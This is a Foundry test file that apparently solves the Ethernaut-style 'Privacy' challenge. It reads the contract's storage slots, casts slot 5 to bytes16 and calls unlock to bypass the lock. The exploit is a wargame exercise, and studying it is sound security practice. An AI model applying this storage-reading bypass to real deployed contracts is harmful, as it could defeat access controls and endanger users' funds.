// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Privacy } from "./Privacy.sol";
import { Read } from "./Read.sol";

contract PrivacyTest is Test {
    Privacy privacy;
    Read read;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        bytes32[3] memory data;
        data[0] = keccak256(abi.encodePacked(tx.origin, "0"));
        data[1] = keccak256(abi.encodePacked(tx.origin, "1"));
        data[2] = keccak256(abi.encodePacked(tx.origin, "2"));
        vm.prank(h3x0r);
        privacy = new Privacy(data);
        read = new Read(data);
    }

    function testPrivacyHack() public {
        vm.startPrank(h3x0r);
        emit log_bytes32(read.readSlot(0));
        emit log_bytes32(read.readSlot(1));
        emit log_bytes32(read.readSlot(2));
        emit log_bytes32(read.readSlot(3));
        emit log_bytes32(read.readSlot(4));
        emit log_bytes32(read.readSlot(5));
        
        // data[2] is at slot 5, we take slot 5 and cast it as bytes16
        bytes16 key = bytes16(read.readSlot(5));
        privacy.unlock(key);

        assertFalse(privacy.locked());
    }
}